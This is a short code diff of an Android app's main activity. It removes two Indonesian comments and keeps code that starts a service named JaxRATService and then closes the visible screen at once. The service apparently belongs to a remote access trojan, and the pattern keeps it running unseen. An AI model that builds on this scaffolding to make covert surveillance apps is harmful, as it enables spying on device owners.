@@ -10,7 +10,6 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // Jalankan Service
         Intent serviceIntent = new Intent(this, JaxRATService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
@@ -18,8 +17,6 @@ public class MainActivity extends Activity {
             startService(serviceIntent);
         }
         
-        // Tutup MainActivity, biarkan Service yang bekerja
         finish();
     }
 }
-
